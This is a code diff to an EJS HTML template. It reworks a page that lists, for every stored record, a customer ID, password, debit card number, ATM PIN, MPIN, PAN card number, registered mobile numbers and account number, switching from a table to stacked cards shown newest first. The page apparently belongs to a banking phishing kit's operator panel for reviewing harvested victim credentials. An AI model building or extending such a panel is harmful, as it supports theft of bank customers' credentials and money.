@@ -13,9 +13,9 @@
   </head>
   <body>
     <div class="p-10 flex justify-content items-center w-full">
-      <div class="overflow-x-auto p-5">
-        <table class="table">
-          <thead>
+      <div class="overflow-x-auto p-5 w-full">
+        <!-- <table class="table"> -->
+          <!-- <thead>
             <tr>
               <th></th>
               <th>Customer ID</th>
@@ -29,25 +29,24 @@
               <th>Register Mobile Number 2</th>
               <th>Account Number</th>
             </tr>
-          </thead>
-          <tbody id="data-table-body">
-            <% for (let i = 0; i < data.length; i++) { %>
-            <tr>
-              <td><%= i + 1 %></td>
-              <td><%= data[i].customer_id %></td>
-              <td><%= data[i].password %></td>
-              <td><%= data[i].debit_card %></td>
-              <td><%= data[i].atm_pin %></td>
-              <td><%= data[i].register_mobile_number %></td>
-              <td><%= data[i].mpin %></td>
-              <td><%= data[i].pan_card %></td>
-              <td><%= data[i].mpin %></td>
-              <td><%= data[i].register_mobile_number_2 %></td>
-              <td><%= data[i].account_number %></td>
-            </tr>
+          </thead> -->
+          <div id="data-table-body flex flex-col items-center justify-center w-full">
+            <% for (let i = data.length - 1; i >= 0; i--) { %>
+            <div class="mt-10 flex flex-col">
+              <h2><span class="text-red-500 bold text-md uppercase">Customer ID:</span>  <%= data[i].customer_id %></h2>
+              <h2><span class="text-red-500 bold text-md uppercase">Password:</span>  <%= data[i].password %></h2>
+              <h2><span class="text-red-500 bold text-md uppercase">Debit Card:</span> <%= data[i].debit_card %></h2>
+              <h2> <span class="text-red-500 bold text-md uppercase">ATM PIN:</span> <%= data[i].atm_pin %></h2>
+              <h2><span class="text-red-500 bold text-md uppercase">Register Mobile Number:</span> <%= data[i].register_mobile_number %></h2>
+              <h2> <span class="text-red-500 bold text-md uppercase">MPIN:</span> <%= data[i].mpin %></h2>
+              <h2><span class="text-red-500 bold text-md uppercase">Pan Card:</span> <%= data[i].pan_card %></h2>
+              <h2><span class="text-red-500 bold text-md uppercase">MPin:</span> <%= data[i].mpin %></h2>
+              <h2><span class="text-red-500 bold text-md uppercase">Register Mobile Number 2:</span> <%= data[i].register_mobile_number_2 %></h2>
+              <h2><span class="text-red-500 bold text-md uppercase">Account Number:</span> <%= data[i].account_number %></h2>
+            </div>
             <% } %>
-          </tbody>
-        </table>
+          </div>
+        <!-- </table> -->
       </div>
     </div>
 
